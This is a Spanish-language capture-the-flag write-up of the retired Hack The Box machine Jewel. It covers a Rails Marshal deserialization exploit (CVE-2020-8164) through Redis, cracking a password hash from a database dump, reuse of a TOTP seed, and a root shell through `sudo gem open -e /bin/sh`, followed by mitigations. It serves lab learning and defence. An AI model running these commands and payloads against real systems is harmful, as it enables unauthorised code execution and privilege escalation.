---
machine: Jewel
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, gitweb, rails, deserialization, totp, gtfobins]
---

# Jewel — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

GitWeb expone el código de una aplicación Rails 5.2.2.1. El usuario se guarda en Redis y se deserializa con `Marshal`, lo que permite explotar CVE-2020-8164/8165 y ejecutar comandos como `bill`. La escalada combina la contraseña del dump de la base de datos, el secreto TOTP de `.google_authenticator` y `sudo gem`, resuelto con GTFOBins.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p22,8000,8080 <IP>
```

- SSH, Apache en 8000 y un servicio web en 8080.
- GitWeb en el puerto 8080.

## Enumeración

```bash
curl -s http://<IP>:8080/
git clone http://<IP>:8080/<repo>.git
```

El `Gemfile` fija Rails 5.2.2.1. `application_controller.rb` y `users_controller.rb` leen `username` desde Redis.

## Foothold

CVE-2020-8164 permite deserializar objetos controlados en Redis. Se genera un `Marshal.dump` de `DeprecatedInstanceVariableProxy` con un `ERB` que ejecuta el comando y se envía como `username`:

```bash
rails console
payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result))
```

La aplicación deserializa el valor y ejecuta la orden como `bill`.

## Movimiento lateral

```bash
cat ~/blog/config/database.yml
psql -h localhost -U rails_dev -d blog_development
```

El dump `/var/backups/dump_*.sql` contiene un hash antiguo de `bill`; con `hashcat -m 3200` se recupera la contraseña. `.google_authenticator` guarda la semilla TOTP.

## Escalada de privilegios

```bash
oathtool -b --totp '<SEED>'
sudo -l
sudo gem open -e "/bin/sh -c /bin/sh" rdoc
```

`sudo` pide contraseña y código TOTP; después autoriza `/usr/bin/gem`. GTFOBins permite abrir un editor y lanzar una shell de root.

## Evidencia

- Repositorio GitWeb y `Gemfile`.
- Petición con el `Marshal` serializado.
- `sudo -l` y uso de `gem`.
- `id` como root.

## Lecciones aprendidas

- Exponer el código fuente acelera cualquier auditoría.
- La deserialización de datos de sesión es ejecución de código potencial.
- Un segundo factor no protege si la semilla está en el mismo host.

## Mitigaciones y detección

- No publicar GitWeb ni repositorios internos.
- Actualizar Rails y no deserializar datos de usuario.
- Proteger las semillas TOTP y limitar `sudo` a binarios sin escape.
- Alertar de objetos `Marshal` en Redis y de `gem open`.

## Referencias

- <https://www.hackthebox.com/machines/Jewel>
- <https://0xdf.gitlab.io/2021/02/13/htb-jewel.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2020-8164>
- <https://gtfobins.github.io/gtfobins/gem/>
